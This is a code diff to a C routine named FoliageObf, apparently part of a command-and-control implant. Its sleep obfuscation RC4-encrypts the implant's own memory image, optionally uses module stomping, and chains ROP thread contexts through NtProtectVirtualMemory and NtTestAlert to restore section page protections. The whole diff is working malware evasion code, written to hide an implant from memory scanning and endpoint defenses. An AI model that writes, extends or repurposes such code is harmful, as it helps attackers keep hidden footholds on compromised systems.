@@ -89,54 +89,57 @@ VOID FoliageObf(
 
     ImageBase = ImageBase1 = ImageBase2 = ImageBase3 = Instance.Session.ModuleBase;
     ImageSize = ImageSize1 = ImageSize2 = ImageSize3 = Instance.Session.ModuleSize;
-
-    // Check if .text section is defined
-    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
-        TxtBase = Instance.Session.TxtBase;
-        TxtSize = Instance.Session.TxtSize;
-        dwProtect  = PAGE_EXECUTE_READ;
-    } else {
-        TxtBase = Instance.Session.ModuleBase;
-        TxtSize = Instance.Session.ModuleSize;
-    }
+//
+//    // Check if .text section is defined
+//    if (Instance.Session.TxtBase != 0 && Instance.Session.TxtSize != 0) {
+//        TxtBase = Instance.Session.TxtBase;
+//        TxtSize = Instance.Session.TxtSize;
+//        dwProtect  = PAGE_EXECUTE_READ;
+//    } else {
+//        TxtBase = Instance.Session.ModuleBase;
+//        TxtSize = Instance.Session.ModuleSize;
+//    }
 
     // Generate random keys
     for ( SHORT i = 0; i < 16; i++ )
         Random[ i ] = RandomNumber32( );
 
-    //Copying payload to other location
-    MemCopy(Instance.Session.Rc4PayloadModule.Buffer,ImageBase,ImageSize);
-    //generating random key
-    for ( SHORT i = 0; i < KEYSIZE; i++ )
-        ((PBYTE)(Instance.Session.KeyPayloadModule.Buffer))[ i ] = RandomNumber32( );
-    //encrypting copy of payload
-    Instance.Win32.SystemFunction032(&(Instance.Session.Rc4PayloadModule),&(Instance.Session.KeyPayloadModule));
+    //if module stomping is enabled
+    if(Instance.Session.Rc4StompedModule.Buffer != NULL) {
+        //Copying payload to other location
+        MemCopy(Instance.Session.Rc4PayloadModule.Buffer, ImageBase, ImageSize);
+        //generating random key
+        for (SHORT i = 0; i < KEYSIZE; i++)
+            ((PBYTE) (Instance.Session.KeyPayloadModule.Buffer))[i] = RandomNumber32();
+        //encrypting copy of payload
+        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4PayloadModule), &(Instance.Session.KeyPayloadModule));
 
-    //storing payload encryption info in stack
-    Key.Buffer = Instance.Session.KeyPayloadModule.Buffer;
-    Key.Length = Key.MaximumLength = Instance.Session.KeyPayloadModule.Length;
+        //storing encrypted payload info in stack
+        Key.Buffer = Instance.Session.KeyPayloadModule.Buffer;
+        Key.Length = Key.MaximumLength = Instance.Session.KeyPayloadModule.Length;
 
-    Rc4.Buffer = Instance.Session.Rc4PayloadModule.Buffer;
-    Rc4.Length = Rc4.MaximumLength = Instance.Session.Rc4PayloadModule.Length;
-
-    NtHeaders = C_PTR( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew );
-    SecHeader = IMAGE_FIRST_SECTION(NtHeaders);
-    NumberOfSections = NtHeaders->FileHeader.NumberOfSections;
-
-    SIZE_T FullLength = ImageSize; //keySize + imageSize
+        Rc4.Buffer = Instance.Session.Rc4PayloadModule.Buffer;
+        Rc4.Length = Rc4.MaximumLength = Instance.Session.Rc4PayloadModule.Length;
 
 
-    //Decrypting stomped module
-    Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));
+        //Decrypting stomped module
+        Instance.Win32.SystemFunction032(&(Instance.Session.Rc4StompedModule),&(Instance.Session.KeyStompedModule));
 
-    Rc4Stomped.Buffer = Instance.Session.Rc4StompedModule.Buffer;
-    Rc4Stomped.Length = Instance.Session.Rc4StompedModule.Length;
-    Rc4Stomped.MaximumLength = Instance.Session.Rc4StompedModule.MaximumLength;
+        //saving stomped module info in stack
+        Rc4Stomped.Buffer = Instance.Session.Rc4StompedModule.Buffer;
+        Rc4Stomped.Length = Instance.Session.Rc4StompedModule.Length;
+        Rc4Stomped.MaximumLength = Instance.Session.Rc4StompedModule.MaximumLength;
 
-    KeyStomped.Buffer = Instance.Session.KeyStompedModule.Buffer;
-    KeyStomped.Length = Instance.Session.KeyStompedModule.Length;
-    KeyStomped.MaximumLength = Instance.Session.KeyStompedModule.MaximumLength;
-
+        KeyStomped.Buffer = Instance.Session.KeyStompedModule.Buffer;
+        KeyStomped.Length = Instance.Session.KeyStompedModule.Length;
+        KeyStomped.MaximumLength = Instance.Session.KeyStompedModule.MaximumLength;
+    }
+    else{
+        Key.Buffer = Random;
+        Key.Length = Key.MaximumLength = 16;
+        Rc4.Buffer = ImageBase;
+        Rc4.Length = Rc4.MaximumLength = ImageSize;
+    }
     if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
     {
         if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance.Config.Implant.ThreadStartAddr, NULL, TRUE, 0, STACKCONST * (Cnt+5), STACKCONST * (Cnt+5), NULL ) ) )
@@ -336,52 +339,6 @@ VOID FoliageObf(
                         *(PVOID *) (RopCopyPayload->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(
                                 Instance.Win32.NtTestAlert);
                         Cnt--;
-                        //Reset original payload page protections. Instead of setting RWX on all of them, set the proper page permissions
-                        for (int i = 0; i < NumberOfSections; i++) {
-                            PageProtectParams[i].SecMemory = C_PTR(ImageBase + SecHeader[i].VirtualAddress);
-                            PageProtectParams[i].SecMemorySize = SecHeader[i].SizeOfRawData;
-                            PageProtectParams[i].Protection = 0;
-                            PageProtectParams[i].OldProtection = 0;
-
-                            if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
-                                PageProtectParams[i].Protection = PAGE_WRITECOPY;
-
-                            if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
-                                PageProtectParams[i].Protection = PAGE_READONLY;
-
-                            if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
-                                (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
-                                PageProtectParams[i].Protection = PAGE_READWRITE;
-
-                            if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
-                                PageProtectParams[i].Protection = PAGE_EXECUTE;
-
-                            if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
-                                (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
-                                PageProtectParams[i].Protection = PAGE_EXECUTE_WRITECOPY;
-
-                            if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
-                                (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
-                                PageProtectParams[i].Protection = PAGE_EXECUTE_READ;
-                            }
-                            if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
-                                (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
-                                (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
-                                PageProtectParams[i].Protection = PAGE_EXECUTE_READWRITE;
-
-                            RopMemProtect[i].ContextFlags = CONTEXT_FULL;
-                            RopMemProtect[i].Rip = U_PTR(Instance.Win32.NtProtectVirtualMemory);
-                            RopMemProtect[i].Rsp -= U_PTR(STACKCONST * Cnt);
-                            RopMemProtect[i].Rcx = U_PTR(NtCurrentProcess());
-                            RopMemProtect[i].Rdx = U_PTR(&(PageProtectParams[i].SecMemory));
-                            RopMemProtect[i].R8 = U_PTR(&(PageProtectParams[i].SecMemorySize));
-                            RopMemProtect[i].R9 = U_PTR(PageProtectParams[i].Protection);
-                            *(PVOID *) (RopMemProtect[i].Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(
-                                    Instance.Win32.NtTestAlert);
-                            *(PVOID *) (RopMemProtect[i].Rsp + (sizeof(ULONG_PTR) * 0x5)) = C_PTR(&TmpValue);
-                            // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );
-                            Cnt--;
-                        }
                     } else {
                         RopMemDec->ContextFlags = CONTEXT_FULL;
                         RopMemDec->Rip = U_PTR(Instance.Win32.SystemFunction032);
@@ -391,17 +348,51 @@ VOID FoliageObf(
                         *(PVOID *) (RopMemDec->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
                         // SystemFunction032( &Rc4, &Key ); Rc4 Decryption
                         Cnt--;
-                        // RW -> RWX
-                        RopSetMemRx->ContextFlags = CONTEXT_FULL;
-                        RopSetMemRx->Rip = U_PTR(Instance.Win32.NtProtectVirtualMemory);
-                        RopSetMemRx->Rsp -= U_PTR(STACKCONST * Cnt);
-                        RopSetMemRx->Rcx = U_PTR(NtCurrentProcess());
-                        RopSetMemRx->Rdx = U_PTR(&TxtBase);
-                        RopSetMemRx->R8 = U_PTR(&TxtSize);
-                        RopSetMemRx->R9 = U_PTR(dwProtect);
-                        *(PVOID *) (RopSetMemRx->Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(Instance.Win32.NtTestAlert);
-                        *(PVOID *) (RopSetMemRx->Rsp + (sizeof(ULONG_PTR) * 0x5)) = C_PTR(&TmpValue);
-                        // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_EXECUTE_READ, & TmpValue );
+                    }
+                    //Reset original payload page protections. Instead of setting RWX on all of them, set the proper page permissions
+                    for (int i = 0; i < NumberOfSections; i++) {
+                        PageProtectParams[i].SecMemory = C_PTR(ImageBase + SecHeader[i].VirtualAddress);
+                        PageProtectParams[i].SecMemorySize = SecHeader[i].SizeOfRawData;
+                        PageProtectParams[i].Protection = 0;
+                        PageProtectParams[i].OldProtection = 0;
+
+                        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE)
+                            PageProtectParams[i].Protection = PAGE_WRITECOPY;
+
+                        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)
+                            PageProtectParams[i].Protection = PAGE_READONLY;
+
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
+                            PageProtectParams[i].Protection = PAGE_READWRITE;
+
+                        if (SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)
+                            PageProtectParams[i].Protection = PAGE_EXECUTE;
+
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE))
+                            PageProtectParams[i].Protection = PAGE_EXECUTE_WRITECOPY;
+
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ)) {
+                            PageProtectParams[i].Protection = PAGE_EXECUTE_READ;
+                        }
+                        if ((SecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_WRITE) &&
+                            (SecHeader[i].Characteristics & IMAGE_SCN_MEM_READ))
+                            PageProtectParams[i].Protection = PAGE_EXECUTE_READWRITE;
+
+                        RopMemProtect[i].ContextFlags = CONTEXT_FULL;
+                        RopMemProtect[i].Rip = U_PTR(Instance.Win32.NtProtectVirtualMemory);
+                        RopMemProtect[i].Rsp -= U_PTR(STACKCONST * Cnt);
+                        RopMemProtect[i].Rcx = U_PTR(NtCurrentProcess());
+                        RopMemProtect[i].Rdx = U_PTR(&(PageProtectParams[i].SecMemory));
+                        RopMemProtect[i].R8 = U_PTR(&(PageProtectParams[i].SecMemorySize));
+                        RopMemProtect[i].R9 = U_PTR(PageProtectParams[i].Protection);
+                        *(PVOID *) (RopMemProtect[i].Rsp + (sizeof(ULONG_PTR) * 0x0)) = C_PTR(
+                                Instance.Win32.NtTestAlert);
+                        *(PVOID *) (RopMemProtect[i].Rsp + (sizeof(ULONG_PTR) * 0x5)) = C_PTR(&TmpValue);
+                        // NtProtectVirtualMemory( NtCurrentProcess(), &Img, &Len, PAGE_READWRITE, NULL,  );
                         Cnt--;
                     }
                     RopSetCtx2->ContextFlags = CONTEXT_FULL;
